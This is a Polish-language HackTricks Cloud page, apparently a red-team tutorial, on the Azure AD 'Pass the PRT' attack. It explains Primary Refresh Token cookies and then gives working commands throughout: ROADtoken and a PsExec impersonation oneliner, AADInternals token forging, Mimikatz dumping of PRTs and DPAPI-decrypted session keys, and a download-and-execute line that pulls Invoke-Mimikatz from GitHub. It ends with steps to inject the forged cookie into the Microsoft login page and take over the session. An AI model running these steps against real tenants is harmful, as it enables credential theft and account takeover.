# Az - Pass the PRT

{% hint style="success" %}
Naucz się i ćwicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naucz się i ćwicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* Sprawdź [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}

## Co to jest PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### Sprawdź, czy masz PRT
```
Dsregcmd.exe /status
```
W sekcji SSO State powinieneś zobaczyć, że **`AzureAdPrt`** jest ustawione na **YES**.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

W tym samym wyniku możesz również zobaczyć, czy **urządzenie jest połączone z Azure** (w polu `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

PRT cookie jest faktycznie nazywane **`x-ms-RefreshTokenCredential`** i jest to JSON Web Token (JWT). JWT zawiera **3 części**, **header**, **payload** i **signature**, podzielone przez `.` i wszystkie zakodowane w url-safe base64. Typowe PRT cookie zawiera następujący header i body:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Faktyczny **Primary Refresh Token (PRT)** jest zawarty w **`refresh_token`**, który jest zaszyfrowany kluczem kontrolowanym przez Azure AD, co sprawia, że jego zawartość jest dla nas nieprzejrzysta i niemożliwa do odszyfrowania. Pole **`is_primary`** oznacza, że główny token odświeżania jest zawarty w tym tokenie. Aby upewnić się, że ciasteczko pozostaje powiązane z konkretną sesją logowania, dla której było przeznaczone, `request_nonce` jest przesyłany ze strony `logon.microsoftonline.com`.

### Przepływ ciasteczka PRT z użyciem TPM

Proces **LSASS** wyśle do TPM **kontekst KDF**, a TPM użyje **klucza sesji** (uzyskanego podczas rejestracji urządzenia w AzureAD i przechowywanego w TPM) oraz poprzedniego kontekstu do **wyprowadzenia** **klucza**, a ten **wyprowadzony klucz** jest używany do **podpisania ciasteczka PRT (JWT).**

**Kontekst KDF** to nonce z AzureAD i PRT tworzący **JWT** zmieszany z **kontekstem** (losowe bajty).

Dlatego, nawet jeśli PRT nie może być wyodrębniony, ponieważ znajduje się wewnątrz TPM, możliwe jest nadużycie LSASS do **żądania wyprowadzonych kluczy z nowych kontekstów i używania wygenerowanych kluczy do podpisywania ciasteczek**.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## Scenariusze nadużycia PRT

Jako **zwykły użytkownik** możliwe jest **żądanie użycia PRT** poprzez poproszenie LSASS o dane SSO.\
Można to zrobić jak **aplikacje natywne**, które żądają tokenów od **Web Account Manager** (broker tokenów). WAM przekazuje żądanie do **LSASS**, który żąda tokenów używając podpisanego PRT assertion. Można to również zrobić za pomocą **przepływów opartych na przeglądarce (web)**, gdzie **ciasteczko PRT** jest używane jako **nagłówek** do uwierzytelniania żądań do stron logowania Azure AS.

Jako **SYSTEM** możesz **ukraść PRT, jeśli nie jest chroniony** przez TPM lub **interagować z kluczami PRT w LSASS** używając API kryptograficznych.

## Przykłady ataków Pass-the-PRT

### Atak - ROADtoken

Więcej informacji na ten temat znajdziesz w [**tym poście**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken uruchomi **`BrowserCore.exe`** z odpowiedniego katalogu i użyje go do **uzyskania ciasteczka PRT**. To ciasteczko może być następnie użyte z ROADtools do uwierzytelnienia i **uzyskania trwałego tokena odświeżania**.

Aby wygenerować ważne ciasteczko PRT, pierwszą rzeczą, której potrzebujesz, jest nonce.\
Możesz to uzyskać za pomocą:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Lub używając [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Następnie możesz użyć [**roadtoken**](https://github.com/dirkjanm/ROADtoken), aby uzyskać nowy PRT (uruchom w narzędziu z procesu użytkownika do ataku):
```powershell
.\ROADtoken.exe <nonce>
```
Jako oneliner:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Następnie możesz użyć **wygenerowanego pliku cookie** do **generowania tokenów** w celu **logowania** za pomocą Azure AD **Graph** lub Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Attack - Using roadrecon

### Attack - Using AADInternals and a leaked PRT

`Get-AADIntUserPRTToken` **pobiera token PRT użytkownika** z komputera dołączonego do Azure AD lub Hybrid. Używa `BrowserCore.exe` do pobrania tokenu PRT.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Albo jeśli masz wartości z Mimikatz, możesz również użyć AADInternals do wygenerowania tokena:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Idź do [https://login.microsoftonline.com](https://login.microsoftonline.com), wyczyść wszystkie ciasteczka dla login.microsoftonline.com i wprowadź nowe ciasteczko.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Następnie przejdź do [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Reszta powinna być domyślna. Upewnij się, że możesz odświeżyć stronę i ciasteczko nie zniknie, jeśli tak się stanie, mogłeś popełnić błąd i musisz przejść przez proces ponownie. Jeśli nie, powinno być dobrze.
{% endhint %}

### Atak - Mimikatz

#### Kroki

1. **PRT (Primary Refresh Token) jest wyodrębniany z LSASS** (Local Security Authority Subsystem Service) i przechowywany do późniejszego użycia.
2. **Następnie wyodrębniany jest klucz sesji**. Ponieważ ten klucz jest początkowo wydawany, a następnie ponownie szyfrowany przez lokalne urządzenie, wymaga odszyfrowania za pomocą klucza głównego DPAPI. Szczegółowe informacje na temat DPAPI (Data Protection API) można znaleźć w tych zasobach: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords), a aby zrozumieć jego zastosowanie, odnieś się do [Pass-the-cookie attack](az-pass-the-cookie.md).
3. Po odszyfrowaniu klucza sesji, **uzyskiwany jest klucz pochodny i kontekst dla PRT**. Są one kluczowe dla **utworzenia ciasteczka PRT**. Konkretnie, klucz pochodny jest używany do podpisania JWT (JSON Web Token), który stanowi ciasteczko. Szczegółowe wyjaśnienie tego procesu zostało przedstawione przez Dirk-jan, dostępne [tutaj](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Zauważ, że jeśli PRT znajduje się w TPM, a nie w `lsass`, **mimikatz nie będzie w stanie go wyodrębnić**.\
Jednakże, możliwe będzie **uzyskanie klucza z klucza pochodnego z kontekstu** z TPM i użycie go do **podpisania ciasteczka (sprawdź opcję 3).**
{% endhint %}

Możesz znaleźć **szczegółowe wyjaśnienie przeprowadzonego procesu** wyodrębniania tych szczegółów tutaj: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
To nie zadziała dokładnie po poprawkach z sierpnia 2021, aby uzyskać tokeny PRT innych użytkowników, ponieważ tylko użytkownik może uzyskać swój PRT (lokalny administrator nie może uzyskać dostępu do PRT innych użytkowników), ale może uzyskać dostęp do swojego.
{% endhint %}

Możesz użyć **mimikatz** do wyodrębnienia PRT:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Skopiuj** część oznaczoną jako **Prt** i zapisz ją.\
Wyodrębnij również klucz sesji (wartość **`KeyValue`** pola **`ProofOfPossesionKey`**), który jest podświetlony poniżej. Jest on zaszyfrowany i będziemy musieli użyć naszych kluczy głównych DPAPI, aby go odszyfrować.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Jeśli nie widzisz żadnych danych PRT, może to oznaczać, że **nie masz żadnych PRT**, ponieważ Twoje urządzenie nie jest połączone z Azure AD lub używasz **starej wersji** Windows 10.
{% endhint %}

Aby **odszyfrować** klucz sesji, musisz **podnieść** swoje uprawnienia do poziomu **SYSTEM**, aby działać w kontekście komputera i móc użyć **klucza głównego DPAPI do jego odszyfrowania**. Możesz użyć następujących poleceń, aby to zrobić:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### Opcja 1 - Pełny Mimikatz

* Teraz chcesz skopiować zarówno wartość Context:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* Jak i wartość derived key:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* Na koniec możesz użyć wszystkich tych informacji, aby **wygenerować ciasteczka PRT**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* Przejdź do [https://login.microsoftonline.com](https://login.microsoftonline.com), wyczyść wszystkie pliki cookie dla login.microsoftonline.com i wprowadź nowy plik cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Następnie przejdź do [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
Reszta powinna być domyślna. Upewnij się, że możesz odświeżyć stronę i ciasteczko nie znika, jeśli znika, mogłeś popełnić błąd i musisz przejść przez proces ponownie. Jeśli nie znika, powinno być dobrze.
{% endhint %}

#### Opcja 2 - roadrecon używając PRT

* Najpierw odnow PRT, co zapisze go w `roadtx.prt`:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Teraz możemy **żądać tokenów** używając interaktywnej przeglądarki z `roadtx browserprtauth`. Jeśli użyjemy polecenia `roadtx describe`, zobaczymy, że token dostępu zawiera roszczenie MFA, ponieważ PRT, którego użyłem w tym przypadku, również miał roszczenie MFA.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### Opcja 3 - roadrecon używając kluczy pochodnych

Mając kontekst i klucz pochodny zrzutowany przez mimikatz, możliwe jest użycie roadrecon do wygenerowania nowego podpisanego ciasteczka za pomocą:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## Referencje

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

{% hint style="success" %}
Ucz się i ćwicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz się i ćwicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* Sprawdź [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) albo **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
